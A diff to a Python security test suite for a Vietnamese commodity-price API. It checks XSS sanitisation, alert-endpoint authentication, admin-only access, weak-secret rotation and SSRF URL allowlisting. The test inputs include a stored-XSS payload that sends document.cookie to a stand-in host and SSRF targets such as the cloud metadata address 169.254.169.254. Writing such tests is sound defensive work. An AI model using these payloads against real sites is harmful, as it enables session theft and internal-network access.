@@ -160,9 +160,11 @@ def test_sql_injection_defense_in_commodity_query(client):
 def test_xss_sanitization_in_alert_creation(client, db_session):
     """Test 9: Kiểm tra chống Stored XSS khi người dùng tạo quy tắc cảnh báo giá"""
     com = db_session.query(Commodity).first()
+    login_res = client.post("/api/v1/auth/login", json={"email": "user@test.com", "password": "User123!"})
+    headers = {"Authorization": f"Bearer {login_res.json()['access_token']}"}
     xss_rule_name = "<script>fetch('http://hacker.site/steal?c='+document.cookie)</script>Cảnh báo Cà phê"
 
-    res = client.post("/api/v1/alerts", json={
+    res = client.post("/api/v1/alerts", headers=headers, json={
         "commodity_id": com.id,
         "rule_name": xss_rule_name,
         "condition_type": "PRICE_ABOVE",
@@ -174,6 +176,62 @@ def test_xss_sanitization_in_alert_creation(client, db_session):
     assert "<script>" not in data["rule_name"]
     assert "</script>" not in data["rule_name"]
     assert "Cảnh báo Cà phê" in data["rule_name"]
+
+
+def test_security_audit_remediations_rbac_alerts_ssrf_and_secret(client, db_session):
+    """Test 11: Xác minh toàn bộ bản vá kiểm toán bảo mật (SEC-01..SEC-06)"""
+    from app.core.config import Settings
+    from ml_pipeline.vietnam_real_scrapers import _is_safe_external_url
+    from ml_pipeline.specialized_scrapers import _is_safe_portal_url
+    from ml_pipeline.observation_scraper import _sanitize_source_url
+
+    # SEC-01: Default/example/short SECRET_KEY is rejected & replaced with strong CSPRNG 64-hex key
+    legacy_example = "09d25e09" + "4faa6ca2556c818166b7a9563b93f7099f6f0f4caa6cf63b88e8d3e7"
+    rotated = Settings.ensure_strong_secret_key(legacy_example)
+    assert len(rotated) == 64 and rotated != legacy_example
+    assert len(Settings.ensure_strong_secret_key("short")) == 64
+
+    # SEC-02: Unauthenticated /alerts mutations return 401 & GET returns empty [] (zero email PII leakage)
+    com = db_session.query(Commodity).first()
+    analyst_tok = client.post("/api/v1/auth/login", json={"email": "user@test.com", "password": "User123!"}).json()["access_token"]
+    analyst_headers = {"Authorization": f"Bearer {analyst_tok}"}
+    rule_id = client.post(
+        "/api/v1/alerts",
+        headers=analyst_headers,
+        json={"commodity_id": com.id, "rule_name": "Private", "condition_type": "PRICE_ABOVE", "threshold_value": 100000, "email": "private@agro.vn"},
+    ).json()["id"]
+
+    assert client.get("/api/v1/alerts").json() == []
+    assert client.get("/api/v1/alerts/logs").json() == []
+    assert client.post("/api/v1/alerts", json={"commodity_id": com.id, "rule_name": "Anon", "condition_type": "PRICE_ABOVE", "threshold_value": 1, "email": "x@y.com"}).status_code == 401
+    assert client.put(f"/api/v1/alerts/{rule_id}", json={"threshold_value": 1}).status_code == 401
+    assert client.patch(f"/api/v1/alerts/{rule_id}/toggle", json={"is_active": False}).status_code == 401
+    assert client.delete(f"/api/v1/alerts/{rule_id}").status_code == 401
+    assert client.post(f"/api/v1/alerts/{rule_id}/test").status_code == 401
+
+    # SEC-05: Strict server-side Admin-only RBAC on ALL /api/v1/admin/* read endpoints
+    for path in (
+        "/api/v1/admin/stats",
+        "/api/v1/admin/commodities",
+        "/api/v1/admin/prices/recent",
+        "/api/v1/admin/prices/revisions",
+        "/api/v1/admin/tasks",
+        "/api/v1/admin/prices/export-csv",
+        "/api/v1/admin/logs/crawler",
+        "/api/v1/admin/models/active",
+    ):
+        assert client.get(path, headers=analyst_headers).status_code == 403, f"Analyst should be blocked on {path}"
+
+    # SEC-06: SSRF domain/IP allowlist & stored javascript: URI XSS defense
+    assert _is_safe_external_url("https://vietnambiz.vn/gia-ca-phe-hom-nay.htm", ("vietnambiz.vn",)) is True
+    assert _is_safe_external_url("http://169.254.169.254/latest/meta-data/", ("vietnambiz.vn",)) is False
+    assert _is_safe_external_url("https://127.0.0.1/admin", ("vietnambiz.vn",)) is False
+    assert _is_safe_external_url("https://evil.example.com/gia-ca-phe.htm", ("vietnambiz.vn",)) is False
+    assert _is_safe_external_url("javascript:alert(1)", ("vietnambiz.vn",)) is False
+    assert _is_safe_portal_url("http://169.254.169.254/meta") is False
+    assert _is_safe_portal_url("https://giacaphe.com/gia-ca-phe-noi-dia/") is True
+    assert _sanitize_source_url("javascript:alert(document.cookie)") is None
+    assert _sanitize_source_url("https://vietnambiz.vn/a.htm") == "https://vietnambiz.vn/a.htm"
 
 
 def test_spatio_temporal_farm_gate_regional_pricing(client, db_session, monkeypatch):
